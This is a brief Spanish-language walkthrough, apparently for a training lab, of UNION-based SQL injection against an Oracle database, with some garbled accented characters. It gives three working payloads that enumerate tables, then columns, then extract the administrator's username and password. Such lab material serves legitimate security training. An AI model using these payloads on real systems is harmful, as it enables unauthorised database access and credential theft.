Lab: SQL injection attack, listing the database contents on Oracle

üéØ Objetivo

Acceder a las tablas del sistema de Oracle para identificar la tabla de usuarios, sus columnas y extraer las credenciales del usuario administrator.

- Enumeraci√≥n de Tablas

En Oracle, en lugar de information_schema, consultamos all_tables.

Payload para listar tablas: [source,sql]

 ' UNION SELECT table_name, NULL FROM all_tables--
 
Nota: Busca una tabla que empiece por USERS_ (en Oracle los nombres suelen estar en may√∫sculas).

- Enumeraci√≥n de Columnas

Una vez identificado el nombre de la tabla (ejemplo: USERS_ABCDEF), consultamos all_tab_columns.

Payload para listar columnas: [source,sql]

 ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ABCDEF'--

Busca nombres de columnas como USERNAME_ABCDEF y PASSWORD_ABCDEF.

- Exfiltraci√≥n de Credenciales

Con los nombres exactos de tabla y columnas, lanzamos el ataque final.

Payload final: [source,sql]

 ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--